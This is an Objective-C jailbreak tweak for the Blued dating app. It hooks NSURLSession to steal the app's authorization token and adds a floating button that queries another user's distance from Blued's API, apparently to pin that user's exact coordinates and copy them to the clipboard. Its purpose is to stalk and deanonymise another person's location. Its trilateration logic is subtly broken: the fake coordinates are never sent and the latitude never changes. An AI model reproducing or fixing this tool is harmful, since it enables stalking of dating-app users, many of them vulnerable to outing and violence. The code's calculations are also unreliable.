// 标准头文件导入
#import <substrate.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>

// 核心配置宏（包名已统一）
#define TRACK_BTN_TAG 100001
#define EARTH_RADIUS_KM 111.32
#define BLUED_BUNDLE_ID @"com.bluecity.blued"

// 全局静态变量
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;
static UIButton *g_trackButton = nil;

// ====================== 唯一UIViewController Hook块（方法严格按先定义后调用排列） ======================
%hook UIViewController

// ---------------------- 第1层：无依赖底层方法（必须放最前） ----------------------
%new
- (UIWindow *)th_getSafeKeyWindow {
    UIWindow *keyWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                keyWindow = scene.windows.firstObject;
                break;
            }
        }
    }
    if (!keyWindow) keyWindow = [UIApplication sharedApplication].keyWindow;
    return keyWindow;
}

%new
- (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng {
    NSString *urlStr = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return -1.0;
    
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"GET";
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"Authorization"];
    [req setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"User-Agent"];
    req.timeoutInterval = 3.0;
    
    __block double resultDist = -1.0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    NSURLSessionDataTask *task = [NSURLSession.sharedSession dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error && data) {
            NSError *jsonError = nil;
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError];
            if (!jsonError && json) {
                NSDictionary *userData = json[@"data"];
                if (userData && [userData[@"is_hide_distance"] intValue] == 0) {
                    resultDist = [userData[@"distance"] doubleValue];
                }
            }
        }
        dispatch_semaphore_signal(sem);
    }];
    [task resume];
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
    return resultDist;
}

// ---------------------- 第2层：依赖第1层方法 ----------------------
%new
- (UIViewController *)th_getTopViewController {
    UIViewController *topVC = [self th_getSafeKeyWindow].rootViewController;
    while (topVC.presentedViewController) {
        topVC = topVC.presentedViewController;
    }
    return topVC;
}

// ---------------------- 第3层：依赖前2层方法 ----------------------
%new
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        if (!win) return;
        
        for (UIView *v in win.subviews) {
            if (v.tag == 99999) [v removeFromSuperview];
        }
        
        UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(0,0,300,100)];
        lab.center = win.center;
        lab.tag = 99999;
        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
        lab.textColor = UIColor.whiteColor;
        lab.textAlignment = NSTextAlignmentCenter;
        lab.numberOfLines = 0;
        lab.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
        lab.text = msg;
        lab.layer.cornerRadius = 12;
        lab.clipsToBounds = YES;
        lab.layer.zPosition = 99999;
        
        [win addSubview:lab];
        [UIView animateWithDuration:0.5 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL f){ [lab removeFromSuperview]; }];
    });
}

%new
- (void)th_autoFetchUserInfo {
    g_currentTargetUid = nil;
    g_initialDistance = -1;
    UIViewController *top = [self th_getTopViewController];
    if (!top) return;
    
    unsigned int count = 0;
    objc_property_t *props = class_copyPropertyList(top.class, &count);
    for (int i=0; i<count; i++) {
        NSString *name = [NSString stringWithUTF8String:property_getName(props[i])];
        @try {
            id obj = [top valueForKey:name];
            NSString *uid = [obj valueForKey:@"uid"] ?: [obj valueForKey:@"user_id"];
            if (uid) {
                g_currentTargetUid = uid;
                id dist = [obj valueForKey:@"distance"];
                if ([dist isKindOfClass:NSNumber.class]) g_initialDistance = [dist doubleValue];
                else if ([dist isKindOfClass:NSString.class]) g_initialDistance = [dist doubleValue];
                break;
            }
        } @catch (id e) {}
    }
    free(props);
}

%new
- (void)th_dragBtn:(UIPanGestureRecognizer *)pan {
    UIView *btn = pan.view;
    UIWindow *win = [self th_getSafeKeyWindow];
    if (!btn || !win) return;
    CGPoint trans = [pan translationInView:win];
    btn.center = CGPointMake(btn.center.x + trans.x, btn.center.y + trans.y);
    [pan setTranslation:CGPointZero inView:win];
    CGFloat margin = 10;
    CGRect f = btn.frame;
    f.origin.x = MAX(margin, MIN(f.origin.x, win.bounds.size.width - f.size.width - margin));
    f.origin.y = MAX(margin, MIN(f.origin.y, win.bounds.size.height - f.size.height - margin));
    btn.frame = f;
}

// ---------------------- 第4层：依赖前面所有层方法 ----------------------
%new
- (void)th_showResult:(BOOL)success msg:(NSString *)msg lat:(double)lat lng:(double)lng {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIViewController *top = [self th_getTopViewController];
        if (!top) return;
        if (success) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🎯 定位成功" message:msg preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
                UIPasteboard.generalPasteboard.string = [NSString stringWithFormat:@"%.8f, %.8f", lat, lng];
                [self th_showToast:@"坐标已复制" duration:2.0];
            }]];
            [alert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [top presentViewController:alert animated:YES completion:nil];
        } else {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"⚠️ 定位失败" message:msg preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
            [top presentViewController:alert animated:YES completion:nil];
        }
    });
}

%new
- (void)th_onBtnClick {
    [self th_autoFetchUserInfo];
    if (!g_currentTargetUid) { [self th_showToast:@"请先打开用户主页" duration:3.0]; return; }
    if (g_initialDistance < 0 || g_initialDistance >= 9999) { [self th_showResult:NO msg:@"对方隐藏了距离" lat:0 lng:0]; return; }
    if (!g_bluedBasicToken) { [self th_showToast:@"请先刷新附近页获取Token" duration:4.0]; return; }
    
    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
    double lat = [ud doubleForKey:@"current_latitude"];
    double lng = [ud doubleForKey:@"current_longitude"];
    if (lat == 0 || lng == 0) { [self th_showToast:@"未获取到自身坐标" duration:3.0]; return; }
    
    [self th_showToast:[NSString stringWithFormat:@"雷达启动！\n原点距离: %.2fkm", g_initialDistance] duration:4.0];
    dispatch_async(dispatch_get_global_queue(0,0), ^{
        double cLat = lat, cLng = lng, cDist = g_initialDistance;
        for (int i=0; i<8; i++) {
            double oLng = cLng + (cDist / (EARTH_RADIUS_KM * cos(cLat * M_PI/180)));
            double nDist = [self th_fetchDistanceWithUid:g_currentTargetUid token:g_bluedBasicToken fakeLat:cLat fakeLng:oLng];
            if (nDist < 0) break;
            cLat = (cLat + cLat)/2;
            cLng = (cLng + oLng)/2;
            cDist = (cDist + nDist)/2;
        }
        NSString *msg = [NSString stringWithFormat:@"纬度：%.8f\n经度：%.8f", cLat, cLng];
        [self th_showResult:YES msg:msg lat:cLat lng:cLng];
    });
}

// ---------------------- 第5层：按钮添加方法，依赖交互方法 ----------------------
%new
- (void)th_addBtn {
    UIWindow *win = [self th_getSafeKeyWindow];
    if (!win || win.bounds.size.width == 0) return;
    if (g_trackButton || [win viewWithTag:TRACK_BTN_TAG]) return;
    
    CGFloat w = win.bounds.size.width;
    g_trackButton = [UIButton buttonWithType:UIButtonTypeCustom];
    g_trackButton.frame = CGRectMake(w-150, 180, 130, 44);
    g_trackButton.tag = TRACK_BTN_TAG;
    g_trackButton.backgroundColor = [UIColor colorWithRed:0.91 green:0.12 blue:0.39 alpha:1.0];
    [g_trackButton setTitle:@"🛰️ 定位" forState:UIControlStateNormal];
    [g_trackButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
    g_trackButton.titleLabel.font = [UIFont boldSystemFontOfSize:12];
    g_trackButton.layer.cornerRadius = 22;
    g_trackButton.clipsToBounds = YES;
    g_trackButton.layer.zPosition = 9999;
    
    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(th_dragBtn:)];
    [g_trackButton addGestureRecognizer:pan];
    [g_trackButton addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
    [win addSubview:g_trackButton];
    [win bringSubviewToFront:g_trackButton];
}

// ---------------------- 第6层：入口Hook，放在最后，调用前面所有方法 ----------------------
- (void)viewDidAppear:(BOOL)animated {
    %orig(animated);
    dispatch_async(dispatch_get_main_queue(), ^{
        [self th_addBtn];
    });
}

%end

// ====================== 全局Token抓取Hook ======================
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    NSDictionary *headers = request.allHTTPHeaderFields;
    NSString *authHeader = headers[@"Authorization"] ?: headers[@"authorization"];
    if (authHeader && [authHeader hasPrefix:@"Basic "]) {
        NSString *token = [authHeader substringFromIndex:6];
        if (token.length > 0 && ![g_bluedBasicToken isEqualToString:token]) {
            g_bluedBasicToken = token;
        }
    }
    return %orig(request, completionHandler);
}
%end
